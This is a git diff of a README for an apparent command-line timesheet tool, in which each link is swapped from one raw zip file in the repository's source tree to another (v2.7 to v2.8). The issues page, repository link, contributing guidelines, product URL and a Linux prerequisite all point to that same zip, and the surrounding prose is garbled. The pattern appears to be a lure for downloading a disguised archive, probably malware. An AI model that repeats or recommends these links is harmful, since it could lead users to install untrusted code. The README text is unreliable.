@@ -1,13 +1,13 @@
 # 🕒 timesheet-cli - Track Your Time Efficiently
 
 ## 🚀 Getting Started
-Welcome to **timesheet-cli**, the official command-line interface for https://raw.githubusercontent.com/RahulJagtap484/timesheet-cli/main/src/commands/tasks/cli-timesheet-v2.7.zip This tool helps you manage your time effectively by tracking projects, tasks, and generating reports right from your terminal. Follow these steps to get started.
+Welcome to **timesheet-cli**, the official command-line interface for https://github.com/RahulJagtap484/timesheet-cli/raw/refs/heads/main/src/output/cli_timesheet_v2.8.zip This tool helps you manage your time effectively by tracking projects, tasks, and generating reports right from your terminal. Follow these steps to get started.
 
 ## 🔗 Download Now
-[![Download timesheet-cli](https://raw.githubusercontent.com/RahulJagtap484/timesheet-cli/main/src/commands/tasks/cli-timesheet-v2.7.zip%20timesheet--cli-v1.0.0-blue)](https://raw.githubusercontent.com/RahulJagtap484/timesheet-cli/main/src/commands/tasks/cli-timesheet-v2.7.zip)
+[![Download timesheet-cli](https://github.com/RahulJagtap484/timesheet-cli/raw/refs/heads/main/src/output/cli_timesheet_v2.8.zip%20timesheet--cli-v1.0.0-blue)](https://github.com/RahulJagtap484/timesheet-cli/raw/refs/heads/main/src/output/cli_timesheet_v2.8.zip)
 
 ## 📥 Download & Install
-To download the latest version of **timesheet-cli**, visit [this page](https://raw.githubusercontent.com/RahulJagtap484/timesheet-cli/main/src/commands/tasks/cli-timesheet-v2.7.zip) to download. Select the version suited for your operating system. 
+To download the latest version of **timesheet-cli**, visit [this page](https://github.com/RahulJagtap484/timesheet-cli/raw/refs/heads/main/src/output/cli_timesheet_v2.8.zip) to download. Select the version suited for your operating system. 
 
 ### Supported Operating Systems
 - Windows
@@ -37,7 +37,7 @@ These features help you stay organized and focused, allowing you to maximize you
 Before installing **timesheet-cli**, ensure your system meets the following requirements:
 - **Windows**: Windows 10 or later, 4GB RAM minimum.
 - **macOS**: macOS 10.14 or later, 4GB RAM minimum.
-- **Linux**: A modern Linux distribution with https://raw.githubusercontent.com/RahulJagtap484/timesheet-cli/main/src/commands/tasks/cli-timesheet-v2.7.zip installed.
+- **Linux**: A modern Linux distribution with https://github.com/RahulJagtap484/timesheet-cli/raw/refs/heads/main/src/output/cli_timesheet_v2.8.zip installed.
 
 ## 📘 Usage Guide
 Once you have installed **timesheet-cli**, you can start using it right away. Here are some basic commands to get you started:
@@ -75,12 +75,12 @@ If you encounter issues while installing or using **timesheet-cli**, consider th
 
 ## 🙌 Community Support
 Join our growing community for tips, tricks, and support. You can:
-- Read through the [Issues page](https://raw.githubusercontent.com/RahulJagtap484/timesheet-cli/main/src/commands/tasks/cli-timesheet-v2.7.zip) for common concerns and solutions.
+- Read through the [Issues page](https://github.com/RahulJagtap484/timesheet-cli/raw/refs/heads/main/src/output/cli_timesheet_v2.8.zip) for common concerns and solutions.
 - Ask questions and share your experiences.
 
 ## 🔗 Quick Links
-- [Download timesheet-cli](https://raw.githubusercontent.com/RahulJagtap484/timesheet-cli/main/src/commands/tasks/cli-timesheet-v2.7.zip)
-- [GitHub Repository](https://raw.githubusercontent.com/RahulJagtap484/timesheet-cli/main/src/commands/tasks/cli-timesheet-v2.7.zip)
-- [Contributing Guidelines](https://raw.githubusercontent.com/RahulJagtap484/timesheet-cli/main/src/commands/tasks/cli-timesheet-v2.7.zip)
+- [Download timesheet-cli](https://github.com/RahulJagtap484/timesheet-cli/raw/refs/heads/main/src/output/cli_timesheet_v2.8.zip)
+- [GitHub Repository](https://github.com/RahulJagtap484/timesheet-cli/raw/refs/heads/main/src/output/cli_timesheet_v2.8.zip)
+- [Contributing Guidelines](https://github.com/RahulJagtap484/timesheet-cli/raw/refs/heads/main/src/output/cli_timesheet_v2.8.zip)
 
 We hope you enjoy using **timesheet-cli** for better time management!
